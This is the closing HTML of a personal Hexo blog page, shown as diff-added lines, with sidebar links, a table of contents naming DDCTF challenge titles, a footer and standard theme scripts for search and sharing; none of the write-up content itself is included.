+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">13</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/alem0n" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="mailto:zlem0n@foxmail.com" target="_blank" title="E-Mail">
+                    
+                      <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://www.weibo.com/u/3555336795" target="_blank" title="微博">
+                    
+                      <i class="fa fa-fw fa-weibo"></i>微博</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://flag0.com/" title="GetFlag" target="_blank">GetFlag</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://alem0n.github.io/" title="lem0n" target="_blank">lem0n</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.coder666.cn/" title="雨时节" target="_blank">雨时节</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.fkomm.cn/" title="緣來來來" target="_blank">緣來來來</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top" title="CDUSEC内部博客" target="_blank">CDUSEC内部博客</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+        </div>
+		<!--my custom code begin-->
+		</div>
+		<!--my custom code end-->
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#MISC"><span class="nav-number">1.</span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#真-签到题"><span class="nav-number">1.1.</span> <span class="nav-text">真-签到题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MulTzor"><span class="nav-number">1.2.</span> <span class="nav-text">MulTzor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PWN-strike"><span class="nav-number">1.3.</span> <span class="nav-text">[PWN] strike</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Wireshark"><span class="nav-number">1.4.</span> <span class="nav-text">Wireshark</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#联盟决策大会"><span class="nav-number">1.5.</span> <span class="nav-text">联盟决策大会</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#伪-声纹锁"><span class="nav-number">1.6.</span> <span class="nav-text">伪-声纹锁</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#滴"><span class="nav-number">2.1.</span> <span class="nav-text">滴~</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB-签到题"><span class="nav-number">2.2.</span> <span class="nav-text">WEB 签到题</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Upload-IMG"><span class="nav-number">2.3.</span> <span class="nav-text">Upload-IMG</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#homebrew-event-loop"><span class="nav-number">2.4.</span> <span class="nav-text">homebrew event loop</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#欢迎报名DDCTF"><span class="nav-number">2.5.</span> <span class="nav-text">欢迎报名DDCTF</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#大吉大利，今晚吃鸡"><span class="nav-number">2.6.</span> <span class="nav-text">大吉大利，今晚吃鸡~</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mysql弱口令"><span class="nav-number">2.7.</span> <span class="nav-text">mysql弱口令</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lem0n</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">24.8k</span>
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+  
+  <link rel="stylesheet" href="/lib/needsharebutton/needsharebutton.css">
+
+  
+  
+  <script src="/lib/needsharebutton/needsharebutton.js"></script>
+
+  <script>
+    
+      pbOptions = {};
+      
+          pbOptions.iconStyle = "box";
+      
+          pbOptions.boxForm = "horizontal";
+      
+          pbOptions.position = "bottomCenter";
+      
+          pbOptions.networks = "Weibo,Wechat,Douban,QQZone,Twitter,Facebook";
+      
+      new needShareButton('#needsharebutton-postbottom', pbOptions);
+    
+    
+  </script>
+
+  
+
+  
+  
+
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.3"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.3"></script>
+
+
+  
+  <script type="text/javascript" src="/js/src/exturl.js?v=5.1.3"></script>
+
+
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+</body>
+</html>
